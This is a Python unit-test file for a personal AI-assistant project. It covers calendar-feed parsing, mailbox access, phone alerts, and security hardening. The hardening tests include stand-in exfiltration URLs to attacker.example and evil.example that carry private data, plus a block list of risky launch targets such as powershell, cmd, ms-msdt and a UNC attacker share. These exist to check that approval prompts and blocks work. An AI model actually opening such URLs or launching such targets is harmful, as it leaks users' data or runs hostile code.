"""Offline tests for the phone channel, mailbox and calendar feed."""
import os
import unittest
from datetime import datetime
from unittest import mock

from jarvis.telegram import TelegramLink
from jarvis.tools import mailbox
from tests.test_core import Base

ICS = """BEGIN:VCALENDAR
BEGIN:VEVENT
DTSTART;TZID=Asia/Kolkata:20261116T090000
SUMMARY:Java lab
LOCATION:Lab 3
RRULE:FREQ=WEEKLY;BYDAY=MO,WE;UNTIL=20261231T000000Z
EXDATE;TZID=Asia/Kolkata:20261118T090000
END:VEVENT
BEGIN:VEVENT
DTSTART;VALUE=DATE:20261120
SUMMARY:Exam registration
  closes
END:VEVENT
BEGIN:VEVENT
DTSTART:20261119T060000Z
SUMMARY:Cancelled thing
STATUS:CANCELLED
END:VEVENT
END:VCALENDAR
"""


class CalendarFeedTests(unittest.TestCase):
    def test_weekly_repeat_exdate_allday_and_folding(self):
        events = mailbox.parse_ics(ICS, datetime(2026, 11, 16), datetime(2026, 11, 30, 23, 59))
        labels = [(e[0].strftime("%m-%d"), e[1]) for e in events]
        self.assertIn(("11-16", "Java lab @ Lab 3"), labels)
        self.assertNotIn("11-18", [d for d, _ in labels])             # EXDATE skipped
        self.assertIn(("11-23", "Java lab @ Lab 3"), labels)
        self.assertIn(("11-20", "Exam registration closes  (all day)"), labels)
        self.assertFalse([l for _, l in labels if "Cancelled" in l])

    def test_count_and_until_stop_repeats(self):
        text = "BEGIN:VEVENT\nDTSTART:20261116T100000\nSUMMARY:x\nRRULE:FREQ=DAILY;COUNT=3\nEND:VEVENT\n"
        events = mailbox.parse_ics(text, datetime(2026, 11, 1), datetime(2026, 12, 31))
        self.assertEqual(len(events), 3)


class MailTests(Base):
    def test_tools_hidden_until_configured_then_send_needs_approval(self):
        names = lambda: {t.name for t in self.reg.tools()}               # noqa: E731
        with mock.patch.dict(os.environ, {"JARVIS_MAIL_USER": "", "JARVIS_MAIL_PASSWORD": ""}):
            self.assertNotIn("mail_list", names())
        env = {"JARVIS_MAIL_USER": "me@gmail.com", "JARVIS_MAIL_PASSWORD": "abcd efgh ijkl mnop"}
        with mock.patch.dict(os.environ, env):
            self.assertIn("mail_send", names())
            self.assertEqual(mailbox.mail_settings()["password"], "abcdefghijklmnop")
            with mock.patch.object(mailbox, "send_mail", return_value="Sent") as sent:
                self.allow = False
                out = self.run_tool("mail_send", {"to": "a@b.com", "subject": "Hi", "body": "Yo"})
                sent.assert_not_called()
                self.assertTrue(self.approvals and "a@b.com" in self.approvals[-1])
                self.assertFalse(out.is_error)

    def test_non_owner_cannot_read_mail(self):
        self.reg.speaker_is_owner = False
        with mock.patch.dict(os.environ, {"JARVIS_MAIL_USER": "me@gmail.com", "JARVIS_MAIL_PASSWORD": "x"}):
            out = self.run_tool("mail_list", {})
        self.assertTrue(out.is_error)

    def test_imap_listing_decodes_headers_and_peeks(self):
        class Box:
            def __init__(self):
                self.cmds = []

            def login(self, *a): pass
            def select(self, name, readonly=False): self.readonly = readonly; return "OK", [b"1"]
            def logout(self): pass

            def uid(self, cmd, *args):
                self.cmds.append((cmd, args))
                if cmd == "SEARCH":
                    return "OK", [b"7 9"]
                raw = b"From: =?utf-8?q?Dean_Office?= <dean@college.edu>\r\nSubject: Exam dates\r\nDate: Mon, 16 Nov 2026\r\n\r\n"
                return "OK", [(b"1 (BODY[HEADER])", raw), b")"]

        box = Box()
        with mock.patch.object(mailbox.imaplib, "IMAP4_SSL", return_value=box):
            out = mailbox.list_mail({"imap": "x", "user": "u", "password": "p"})
        self.assertTrue(box.readonly)
        self.assertIn("Dean Office", out)
        self.assertIn("2 matching in total", out)
        self.assertTrue(out.split("\n")[1].startswith("[id 9]"))                         # newest first
        self.assertTrue(all("PEEK" in str(a) for c, a in box.cmds if c == "FETCH"))


class PhoneTests(Base):
    def phone(self):
        return self.reg.phone

    def test_unlinked_then_ntfy_topic(self):
        with mock.patch.dict(os.environ, {"NTFY_TOPIC": ""}):
            self.assertFalse(self.phone().available())
            self.assertIn("isn't linked", self.run_tool("message_phone", {"text": "hi"}).text)
            posts = []
            with mock.patch("jarvis.phone.requests.post",
                            side_effect=lambda url, **kw: posts.append((url, kw)) or mock.Mock(ok=True)):
                out = self.run_tool("setup_phone_alerts", {}).text
                topic = self.phone().topic
                self.assertTrue(topic.startswith("jay-") and len(topic) > 16 and topic in out)
                self.assertEqual(self.phone().topic, topic)                   # stable across calls
                self.run_tool("message_phone", {"text": "buy milk"})
        self.assertTrue(all(u.endswith(topic) for u, _ in posts))
        self.assertEqual(posts[-1][1]["data"], b"buy milk")

    def test_telegram_gets_text_and_file_needs_approval(self):
        sent = []
        tg = mock.Mock(chat_id=5, send=lambda c, t: sent.append(t), send_file=lambda c, p: sent.append(("file", p)))
        self.phone().telegram = tg
        self.phone().path.write_text("", encoding="utf-8")
        with mock.patch.dict(os.environ, {"NTFY_TOPIC": ""}):
            self.allow = False
            blocked = self.run_tool("message_phone", {"text": "x", "file_path": __file__})
            self.assertTrue(self.approvals)
            self.assertFalse(sent)
            self.allow = True
            self.run_tool("message_phone", {"text": "here", "file_path": __file__})
        self.assertIn(("file", __file__), sent)

    def test_failure_never_raises(self):
        self.phone().create_topic()
        with mock.patch("jarvis.phone.requests.post", side_effect=OSError("offline")):
            self.assertEqual(self.phone().send("Jay", "x"), [])
            self.phone().send_async("Jay", "x")


class TelegramVoiceTests(unittest.TestCase):
    def make(self, tmp):
        from pathlib import Path
        got = []
        link = TelegramLink("tok", Path(tmp), on_message=lambda t, c: got.append(t), on_info=lambda t: None)
        link.chat_id = 5
        link.send = lambda c, t: got.append(("sent", t))
        return link, got

    def test_voice_note_from_paired_chat_is_transcribed(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            link, got = self.make(tmp)
            link.transcribe_voice = lambda fid: "remind me at six"
            link.handle({"chat": {"id": 5}, "voice": {"file_id": "f"}})
            self.assertIn("remind me at six", got)

    def test_voice_from_stranger_ignored_and_failure_reported(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            link, got = self.make(tmp)
            link.transcribe_voice = lambda fid: ""
            link.handle({"chat": {"id": 99}, "voice": {"file_id": "f"}})
            self.assertEqual(got, [])
            link.handle({"chat": {"id": 5}, "voice": {"file_id": "f"}})
            self.assertTrue(any("couldn't make out" in str(g) for g in got))


if __name__ == "__main__":
    unittest.main()


class TooLargeRequestTests(Base):
    def test_413_moves_on_to_the_next_brain_instead_of_failing(self):
        import httpx
        import openai
        from jarvis.providers import OpenAICompatProvider, ProviderUnavailable
        from tests.test_core import FakeOpenAI
        resp = httpx.Response(413, request=httpx.Request("POST", "https://x"))
        error = openai.APIStatusError("Request too large", response=resp, body=None)
        provider = OpenAICompatProvider(self.cfg, self.reg, "sys", "groq", client=FakeOpenAI([error]))
        with self.assertRaises(ProviderUnavailable):
            provider.turn("convert 100 USD to INR", lambda s: True, lambda n: None)
        self.assertGreater(provider.cool_until, 0)            # and it is left alone for a minute


class HardeningTests(Base):
    def test_new_sites_and_local_addresses_need_a_yes(self):
        browser = self.reg.browser
        self.assertIsNone(browser.site_confirm({"url": "https://newerp.kluniversity.in/x"}))      # the user's portal
        self.assertIn("hasn't opened before", browser.site_confirm({"url": "https://example.org/?q=secret"}))
        self.assertIn("WARNING", browser.site_confirm({"url": "http://127.0.0.1:8765/"}))
        self.assertIn("WARNING", browser.site_confirm({"url": "http://192.168.1.1/admin"}))
        browser.remember_host("https://example.org/a")
        self.assertIsNone(browser.site_confirm({"url": "https://example.org/other?x=1"}))

    def test_browser_open_asks_and_declining_opens_nothing(self):
        self.allow = False
        with mock.patch.object(self.reg.browser, "page", side_effect=AssertionError("must not open")):
            out = self.run_tool("browser_open", {"url": "https://attacker.example/?d=private"})
        self.assertTrue(self.approvals)
        self.assertFalse(out.is_error and "must not open" in out.text)

    def test_page_watch_on_new_address_needs_approval(self):
        from jarvis.watches import Watches, register
        register(self.reg, Watches(self.agent.store, self.reg))
        self.allow = False
        self.run_tool("add_watch", {"name": "x", "kind": "site", "target": "https://new.example/"})
        self.assertTrue(self.approvals)
        self.assertEqual(self.agent.store.list_tasks(), [])
        self.approvals.clear()
        self.run_tool("add_watch", {"name": "news", "kind": "news", "target": "AI"})
        self.assertFalse(self.approvals)                              # news needs no site visit

    def test_secret_files_never_go_to_the_phone(self):
        import tempfile
        from pathlib import Path
        with tempfile.TemporaryDirectory() as tmp:
            secret = Path(tmp) / ".env"
            secret.write_text("KEY=1", encoding="utf-8")
            self.reg.phone.telegram = mock.Mock(chat_id=5)
            out = self.run_tool("message_phone", {"text": "here", "file_path": str(secret)})
        self.assertTrue(out.is_error)
        self.reg.phone.telegram.send_file.assert_not_called()

    def test_pairing_pauses_after_wrong_codes(self):
        import tempfile
        from pathlib import Path
        with tempfile.TemporaryDirectory() as tmp:
            info = []
            link = TelegramLink("tok", Path(tmp), on_message=lambda *a: None, on_info=info.append)
            link.send = lambda c, t: None
            for n in range(5):
                link.handle({"chat": {"id": 9}, "text": f"/pair 00000{n}"})
            self.assertTrue(info)                                      # the owner is told
            link.handle({"chat": {"id": 9}, "text": f"/pair {link.code}"})
            self.assertIsNone(link.chat_id)                            # even the right code is refused while paused

    def test_window_token_check_is_constant_time_and_exact(self):
        from jarvis.ui import _same
        self.assertTrue(_same("abc", "abc"))
        self.assertFalse(_same("abd", "abc"))
        self.assertFalse(_same("", "abc"))
        self.assertFalse(_same("é", "abc"))


class OpenAppGuardTests(unittest.TestCase):
    def test_which_targets_ask_first(self):
        from jarvis.tools.pc import open_risk
        for fine in ("notepad", "calc", "chrome", "C:/Users/me/report.pdf", "D:/notes", "https://www.youtube.com/",
                     "https://github.com/open-jarvis/OpenJarvis", "mailto:a@b.com"):
            self.assertIsNone(open_risk(fine), fine)
        for risky in ("C:/Users/me/Downloads/setup.exe", "run.bat", "x.ps1", "powershell", "cmd", "setup.msi",
                      "https://evil.example/c?d=SECRETDATA", "https://" + "a" * 70 + ".evil.example/",
                      "http://127.0.0.1:11434", "http://192.168.1.1/", "ms-msdt:/id", "search-ms:query=x",
                      "file:///C:/Windows/System32/calc.exe", "\\\\attacker\\share\\x", "shortcut.lnk"):
            self.assertIsNotNone(open_risk(risky), risky)

    def test_declined_risky_open_does_not_start_anything(self):
        from tests.test_core import Base

        class T(Base):
            def runTest(self):
                self.allow = False
                with mock.patch("os.startfile") as start:
                    self.run_tool("open_app", {"target": "http://127.0.0.1:11434"})
                    self.run_tool("open_app", {"target": "evil.bat"})
                    start.assert_not_called()
                    self.allow = True
                    self.run_tool("open_app", {"target": "notepad"})
                    start.assert_called_once()

        case = T()
        case.setUp()
        try:
            case.runTest()
        finally:
            case.tearDown()


class MailFolderTests(unittest.TestCase):
    def test_everyday_folder_names_map_to_the_providers_names(self):
        gmail, other = {"imap": "imap.gmail.com"}, {"imap": "mail.college.edu"}
        self.assertEqual(mailbox._folder_name(gmail, "sent"), "[Gmail]/Sent Mail")
        self.assertEqual(mailbox._folder_name(other, "Sent"), "Sent")
        self.assertEqual(mailbox._folder_name(gmail, ""), "INBOX")
        self.assertEqual(mailbox._folder_name(gmail, "Labels/Exams"), "Labels/Exams")

    def test_missing_folder_is_a_clear_error_and_never_opens_for_writing(self):
        class Box:
            def login(self, *a): pass
            def select(self, name, readonly=False):
                self.seen = (name, readonly)
                return "NO", []
        box = Box()
        with mock.patch.object(mailbox.imaplib, "IMAP4_SSL", return_value=box):
            with self.assertRaises(ValueError):
                mailbox._connect({"imap": "imap.gmail.com", "user": "u", "password": "p"}, "nope")
        self.assertTrue(box.seen[1])


class SkillContentTests(Base):
    def test_every_tool_a_skill_names_exists(self):
        import re
        from jarvis.skills import BUILTIN_DIR, SkillBook
        from jarvis.watches import Watches, register, register_git
        register(self.reg, Watches(self.agent.store, self.reg))
        register_git(self.reg)
        known = {t.name for t in self.reg.tools()} | {"enable_tools"}
        book = SkillBook(self.cfg.data_dir)
        self.assertGreaterEqual(len(book.skills), 27)
        for skill in book.skills.values():
            if skill.source != "built-in":
                continue
            for name in set(re.findall(r"`([a-z]+_[a-z_]+)`", skill.body)):
                self.assertIn(name, known, f"skill {skill.name} mentions a tool Jay doesn't have: {name}")

    def test_hermes_skills_credit_their_source_and_the_licence_ships(self):
        from jarvis.skills import BUILTIN_DIR
        self.assertIn("MIT License", (BUILTIN_DIR / "LICENSE-Hermes.txt").read_text(encoding="utf-8"))
        for name in ("systematic-debugging", "email-inbox-triage", "weekly-review-planning", "document-to-action-items"):
            self.assertIn("Hermes Agent", (BUILTIN_DIR / name / "SKILL.md").read_text(encoding="utf-8"))
